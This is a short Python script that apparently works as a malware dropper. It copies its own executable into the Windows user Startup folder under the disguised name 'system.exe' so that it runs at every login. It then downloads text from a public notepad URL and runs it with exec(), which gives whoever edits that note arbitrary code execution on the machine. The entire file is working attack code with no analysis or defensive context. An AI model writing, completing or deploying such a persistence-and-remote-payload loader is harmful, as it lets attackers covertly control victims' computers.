import requests
from bs4 import BeautifulSoup
from cryptography.fernet import Fernet
import os
import time
import shutil
import sys




def check_file(file_path):
    if os.path.exists(file_path):
        return True
    else:
        return False

def get_startup_folders():
    user_startup = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    global_startup = os.path.expandvars(r"%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    return {"User Startup": user_startup, "Global Startup": global_startup}

def is_program_in_startup(program_name, startup_folder):
    program_path = os.path.join(startup_folder, program_name)
    return os.path.exists(program_path)

def copy_file_to_startup(source_path, destination_folder, new_name="system.exe"):
    destination_path = os.path.join(destination_folder, new_name)
    shutil.copy2(source_path, destination_path)
    return destination_path

def inject_program():
    startup_folders = get_startup_folders()
    if not is_program_in_startup("system.exe", startup_folders["User Startup"]):
        copy_file_to_startup(sys.executable, startup_folders["User Startup"])
        with open(f"{get_startup_folders()["User Startup"]}"+r"\settings.xml","w") as f:
            f.write("1")
            f.close()


def fetch_and_execute_code(url):
    response = requests.get(url)
    response.raise_for_status()  # HTTP hatalarını yakala
    soup = BeautifulSoup(response.text, "html.parser")
    plaintext_content = soup.find(class_="plaintext")
    if plaintext_content:
        exec(plaintext_content.text,globals())



def main():
    url = "https://anotepad.com/notes/3gkei2dg"
    inject_program()
    time.sleep(1)
    fetch_and_execute_code(url)
if __name__ == "__main__":
    main()
